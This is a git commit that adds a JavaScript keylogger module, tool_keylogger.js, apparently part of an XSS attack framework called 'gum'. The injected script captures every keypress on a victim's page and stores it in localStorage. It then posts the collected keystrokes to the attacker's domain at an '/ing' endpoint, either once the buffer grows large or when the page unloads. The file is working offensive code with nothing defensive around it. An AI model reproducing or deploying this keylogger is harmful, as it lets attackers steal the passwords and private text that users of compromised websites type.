7e7e16455115013eef1555c5eda7ea4cb2c07491
quininer <quininer@live.com>
2014-05-05 15:19:11 +0800

    更新键盘记录器

---
+++ static/brows/tool_keylogger.js
@@ -0,0 +1,34 @@
+/*
+    quininer[http://wiremask.eu/xss-keylogger/] - 140505
+    keylogger - null
+        - keylogger(local + Not IME)
+            gum.post('http://'+gum.domain+'/ing',
+                {'keylogs':window.localStorage.getItem('gum_keyslog')})
+        and
+            browserinfo['keylogs'] = b64encode(str(request.forms.get('keylogs')))
+ */
+if ('gum_keyslog' in window.localStorage){
+    window.localStorage.setItem('gum_keyslog', '')
+};
+
+function gum_postkeylogs(){
+    gum.post('http://'+gum.domain+'/ing',
+        {'keylogs':window.localStorage.getItem('gum_keyslog')});
+    window.localStorage.gum_keyslog = '';
+};
+
+document.onkeypress = function(e){
+    var get = window.event?event:e;
+    var key = get.keyCode?get.keyCode:get.charCode;
+    key = String.fromCharCode(key);
+    window.localStorage.gum_keyslog += key;
+    if(window.localStorage.gum_keyslog.length >= 2500*1000){
+        gum_postkeylogs();
+    };
+};
+
+if(gum.jquery()){
+    $(window).unload(gum_postkeylogs);
+}else{
+    window.onbeforeunload = gum_postkeylogs();
+};
